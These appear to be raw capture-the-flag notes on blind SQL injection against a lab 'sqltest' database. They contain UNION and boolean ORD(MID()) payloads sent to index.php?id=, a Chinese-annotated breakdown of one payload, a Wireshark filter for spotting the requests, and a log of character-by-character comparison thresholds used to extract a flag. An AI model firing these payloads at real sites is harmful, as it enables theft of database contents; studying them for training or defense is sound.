
UNION ALL SELECT NULL,NULL,(
SELECT CONCAT
(0x717a6a7871,IFNULL(CAST(table_name AS CHAR),0x20),0x7178716b71)
 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x73716c74657374(sqltest)) LIMIT 2,1
),NULL

-3063 UNION ALL SELECT NULL,NULL,(SELECT CONCAT(0x717a6a7871,IFNULL(CAST(table_name AS CHAR),0x20),0x7178716b71) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x73716c74657374) LIMIT 1,1),NULL-- WqhF

/index.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM sqltest.flag),2,1))>51

/index.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM sqltest.flag),2,1))>48

/index.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM sqltest.flag),2,1))>9

/index.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(flag_here AS CHAR),0x20) FROM sqltest.flag ORDER BY flag_here LIMIT 0,1),1,1))>64

/index.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(flag_here AS CHAR),0x20) FROM sqltest.flag ORDER BY flag_here LIMIT 0,1),1,1))>96

/index.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(flag_here AS CHAR),0x20) FROM sqltest.flag ORDER BY flag_here LIMIT 0,1),1,1))>112

/index.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(flag_here AS CHAR),0x20) FROM sqltest.flag ORDER BY flag_here LIMIT 0,1),1,1))>104

/index.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(flag_here AS CHAR),0x20) FROM sqltest.flag ORDER BY flag_here LIMIT 0,1),1,1))>102

/index.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(flag_here AS CHAR),0x20) FROM sqltest.flag ORDER BY flag_here LIMIT 0,1),1,1))>101












AND ORD(	字符串 -> ASCII
	MID(	取出 n 位字符串
		(
			SELECT IFNULL(	如果为 NULL 则返回0x20
				CAST(
					flag_here AS CHAR
					),0x20
				) FROM sqltest.flag ORDER BY flag_here LIMIT 0,1	从 flag_here 列中取出整个 flag字符串
			),1,1
		)
	)>101


# ord()
# mid()	字符串从1开始，而非0，Length是可选项，如果没有提供，MID()函数将返回余下的字符串。




http.response_for.uri contains "%200%2C1%29%2C1%2C1%29%29%3E" && http.content_length >= 900

/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E64
/index.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(flag_here AS CHAR),0x20) FROM sqltest.flag ORDER BY flag_here LIMIT 0,1),1,1))>64


C1,1))>64]
C1,1))>96]
C1,1))>100]
C1,1))>101]
C2,1))>96]
C2,1))>104]
C2,1))>106]
C2,1))>107]
C3,1))>96]
C4,1))>96]
C4,1))>100]
C4,1))>102]
C5,1))>96]
C5,1))>112]
C5,1))>120]
C5,1))>122]
C6,1))>64]
C6,1))>96]
C6,1))>112]
C6,1))>114]
C7,1))>96]
C7,1))>112]
C8,1))>96]
C8,1))>104]
C8,1))>106]
C8,1))>107]
C9,1))>48]
C9,1))>72]
C9,1))>84]
C9,1))>90]
C9,1))>93]
C9,1))>94]
C10,1))>64]
C10,1))>96]
C10,1))>112]
C10,1))>114]
C10,1))>115]
C11,1))>96]
C11,1))>100]
C12,1))>96]
C12,1))>112]
C12,1))>114]
C13,1))>96]
C13,1))>112]
C13,1))>114]
C13,1))>115]
C14,1))>96]
C14,1))>112]
C14,1))>120]
C14,1))>124]






